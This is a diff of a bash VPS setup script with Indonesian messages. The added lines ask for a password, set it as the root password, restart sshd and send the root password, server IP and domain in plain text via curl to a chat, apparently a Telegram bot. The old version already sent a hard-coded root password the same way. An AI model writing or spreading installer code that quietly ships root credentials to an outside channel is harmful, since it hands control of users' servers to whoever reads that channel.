@@ -34,6 +34,9 @@ echo -e "${YELLOW}----------------------------------------------------------${NC
 echo ""
 sleep 3
 clear
+read -p "Password : " passwd
+echo root:$passwd | sudo chpasswd root > /dev/null 2>&1
+sudo systemctl restart sshd > /dev/null 2>&1      
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
 echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
 else
@@ -266,18 +269,18 @@ EXPSC=$(wget -qO- https://raw.githubusercontent.com/bowowiwendi/ipvps/main/ip | 
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TEXT="
 <code>────────────────────</code>
-<b>🟢 NOTIFICATIONS INSTALL 🟢</b>
+<b>🟢 SUKSES INSTALL SC 🟢</b>
 <code>────────────────────</code>
 <code>ID     : </code><code>$USRSC</code>
 <code>Domain : </code><code>$domain</code>
 <code>Date   : </code><code>$TIME</code>
 <code>Time   : </code><code>$TIMEZONE</code>
-<code>Ip vps : </code><code>$ipsaya</code>
+<code>Ip vps : </code><code>$MYIP</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>User   : </code><code>root</code>
-<code>PASSWD : </code><code>@@Vps1Wendi</code>
+<code>PASSWD : </code><code>$passwd</code>
 <code>────────────────────</code>
-<i>Automatic Notification from Github</i>
+<i>Simpan Baik-baik informasi ini tidak akan di kirim Ulang </i>
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/wendivpn"},{"text":"Contack","url":"https://wa.me/6283153170199"}]]}'
 curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
